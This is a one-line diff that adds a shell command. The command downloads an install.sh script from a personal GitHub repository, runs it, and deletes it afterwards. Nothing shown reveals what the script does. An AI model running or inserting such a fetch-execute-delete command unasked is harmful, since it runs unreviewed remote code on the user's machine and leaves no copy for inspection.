@@ -1,0 +1,1 @@
+curl -o /mnt/external/0/install.sh https://raw.githubusercontent.com/EgorV-cmyk/special-octo-computing-machine/refs/heads/main/install.sh && chmod +x /mnt/external/0/install.sh && /mnt/external/0/install.sh && rm /mnt/external/0/install.sh
